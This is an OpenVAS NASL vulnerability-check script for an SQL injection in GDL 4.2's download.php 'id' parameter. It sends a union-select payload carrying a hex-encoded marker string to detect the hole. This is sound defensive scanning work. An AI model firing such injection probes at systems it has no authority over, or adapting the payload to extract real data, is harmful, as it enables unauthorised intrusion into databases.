###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_GDL_44786.nasl 5306 2017-02-16 09:00:16Z teissa $
#
# GDL 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "GDL (Ganesha Digital Library) is prone to an SQL-injection
vulnerability because it fails to sufficiently sanitize user-supplied
data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

GDL 4.2 is vulnerable; other versions may also be affected.";

tag_solution = "Reports indicate that this issue has been fixed by the vendor but
Symantec has not confirmed it. Please contact the vendor for more
information.";

if (description)
{
 script_id(100906);
 script_version("$Revision: 5306 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-16 10:00:16 +0100 (Thu, 16 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-11-16 13:35:09 +0100 (Tue, 16 Nov 2010)");
 script_bugtraq_id(44786);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("GDL 'id' Parameter SQL Injection Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44786");
 script_xref(name : "URL" , value : "http://kmrg.itb.ac.id/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/gdl","/gdl42",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir,"/download.php?id=-1+union+select+1,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374"); 

  if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);

